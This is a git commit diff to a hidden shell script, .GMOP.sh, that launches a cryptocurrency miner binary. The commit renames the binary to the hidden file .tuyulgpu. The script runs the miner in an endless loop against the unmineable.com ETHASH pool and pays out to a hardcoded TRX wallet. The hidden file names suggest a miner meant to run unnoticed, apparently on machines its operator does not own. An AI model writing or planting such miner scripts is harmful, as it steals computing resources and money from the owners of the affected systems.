13200815fa9a80a96adf9ff980360e71799ab470
Test2443 <101375280+Test2443@users.noreply.github.com>
2022-03-11 08:15:22 +0530

    Update .GMOP.sh

--- .GMOP.sh
+++ .GMOP.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-God_Miner#ek61-6h9x)
-chmod +x tuyulgpu
+chmod +x .tuyulgpu
 while [ 1 ]; do
 ./.tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 10
